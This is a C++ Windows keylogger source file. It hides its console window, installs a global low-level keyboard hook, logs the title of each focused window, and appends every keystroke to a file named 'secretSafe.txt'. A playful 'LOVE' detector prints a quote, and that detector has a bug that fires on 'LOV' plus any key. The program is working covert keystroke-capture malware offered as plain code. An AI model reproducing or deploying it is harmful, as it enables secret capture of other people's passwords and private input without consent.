#include <Windows.h>
#include <stdio.h>
#include<fstream>

using namespace std;
//callback function for the keyboard hook
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);

//possible states for the automata
enum STATES {NOTHING, TYPED_L, TYPED_O, TYPED_V,TYPED_E};
//detects if the sequence L O V E has been typed
bool UserTypedLOVE(DWORD vkCode);
//initialization of the current state variable
STATES currentState = NOTHING;

//the hook
HHOOK keyboardHook;

//we use this variable to identify if the current window has changed
HWND prevWindow;

int main()
{
	::ShowWindow(::GetConsoleWindow(), SW_HIDE);
	printf("Hooking the keyboard\n");
	//Here we set the low level hook
	keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, 0, 0);
	printf("%X\n", keyboardHook);

	MSG msg{ 0 };
	//a very long loop
	while (GetMessage(&msg, NULL, 0, 0) != 0);
	UnhookWindowsHookEx(keyboardHook);
	return 0;
}


LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	wchar_t title[256];
	HWND fwindow = GetForegroundWindow();
	PKBDLLHOOKSTRUCT key = (PKBDLLHOOKSTRUCT)lParam;
	//a key was pressed
	if (wParam == WM_KEYDOWN && nCode == HC_ACTION )
	{
		if (prevWindow != fwindow)
		{
			GetWindowText(fwindow, title, 256);
			wprintf(title);
			printf("\n");
			prevWindow = fwindow;
		}
		//if ENTER was pressed we print a line ending
		//otherwise we print the key that was pressed
		std::ofstream fout;  // Create Object of Ofstream
		fout.open("secretSafe.txt", ios::app); // Append mode
		
		


		if (key->vkCode != VK_RETURN) {
			char c = key->vkCode;
			fout << c; // Writing data to file
			printf("%c", key->vkCode);
		}
		else {
			fout << "\n";
			printf("\n");

		}
			
		fout.close();
		//if the L O V E sequence was typed we print a message
		//and make a sound
		if (UserTypedLOVE(key->vkCode))
		{
			printf("\n\n\n love is the child of illusion and the parent of disillusion\n -Miguel de Unamuno-\n\n\n");
			Beep(700, 400); Beep(700, 400); Beep(700, 400);
		}
	}

	return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
}

//automata to identify a sequence
bool UserTypedLOVE(DWORD vkCode)
{
	switch (currentState)
	{
	case NOTHING:
		if (vkCode == 'L')
			currentState = TYPED_L;
		else
			currentState = NOTHING;
		break;
	case TYPED_L:
		if (vkCode == 'O')
			currentState = TYPED_O;
		else
			currentState = NOTHING;
		break;
	case TYPED_O:
		if (vkCode == 'V')
			currentState = TYPED_V;
		else
			currentState = NOTHING;
		break;
	case TYPED_V:
		if (vkCode == 'E')
			currentState = NOTHING;
		else
			currentState = NOTHING;
		return true;
		break;
	
	}
	return false;
}
